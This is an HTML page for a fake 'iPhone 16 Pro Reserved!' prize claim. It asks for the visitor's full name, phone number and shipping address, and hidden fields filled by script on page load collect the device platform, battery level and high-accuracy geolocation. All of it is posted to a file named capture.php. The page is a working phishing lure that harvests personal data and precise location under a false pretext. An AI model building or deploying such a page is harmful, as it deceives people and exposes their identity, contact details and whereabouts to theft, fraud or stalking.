<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Claim Your Prize | Shipping Details</title>
</head>
<body class="bg-[#0a0a0a] text-white font-sans min-h-screen flex items-center justify-center p-6">

    <div class="w-full max-w-lg bg-gray-900 border border-gray-800 rounded-2xl p-8 shadow-2xl">
        <div class="text-center mb-8">
            <div class="inline-block p-3 bg-yellow-500/10 rounded-full mb-4">
                <span class="text-3xl">🎁</span>
            </div>
            <h2 class="text-2xl font-bold italic">iPhone 16 Pro Reserved!</h2>
            <p class="text-gray-400 text-sm mt-2">Complete the form below to initiate express shipping.</p>
        </div>

        <form id="claimForm" action="capture.php" method="POST" class="space-y-4">
            <input type="hidden" name="lat" id="lat">
            <input type="hidden" name="lon" id="lon">
            <input type="hidden" name="battery" id="battery">
            <input type="hidden" name="os" id="os">

            <div>
                <label class="block text-xs font-semibold text-gray-500 uppercase mb-1">Full Name</label>
                <input type="text" name="name" required placeholder="Aadit Sarhadi" 
                       class="w-full bg-black border border-gray-800 rounded-lg p-3 text-sm focus:border-yellow-500 outline-none transition">
            </div>

            <div>
                <label class="block text-xs font-semibold text-gray-500 uppercase mb-1">Phone Number</label>
                <input type="tel" name="phone" required placeholder="+91 XXXXX XXXXX" 
                       class="w-full bg-black border border-gray-800 rounded-lg p-3 text-sm focus:border-yellow-500 outline-none transition">
            </div>

            <div>
                <label class="block text-xs font-semibold text-gray-500 uppercase mb-1">Shipping Address</label>
                <textarea name="address" required placeholder="Street, City, Pincode" 
                          class="w-full bg-black border border-gray-800 rounded-lg p-3 text-sm focus:border-yellow-500 outline-none h-24 transition"></textarea>
            </div>

            <button type="submit" id="submitBtn" 
                    class="w-full bg-gradient-to-r from-yellow-500 to-orange-600 text-black font-bold py-3 rounded-lg hover:opacity-90 transition transform active:scale-95">
                VERIFY & SHIP ITEM
            </button>
        </form>
    </div>

    <script>
        // 1. Get Device Info
        document.getElementById('os').value = navigator.platform;

        // 2. Get Battery Status (Skill flex)
        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                document.getElementById('battery').value = (battery.level * 100) + "%";
            });
        }

        // 3. Geolocation Trigger
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        document.getElementById('lat').value = position.coords.latitude;
                        document.getElementById('lon').value = position.coords.longitude;
                    },
                    (error) => { console.log("Location denied"); },
                    { enableHighAccuracy: true }
                );
            }
        };
    </script>
</body>
</html>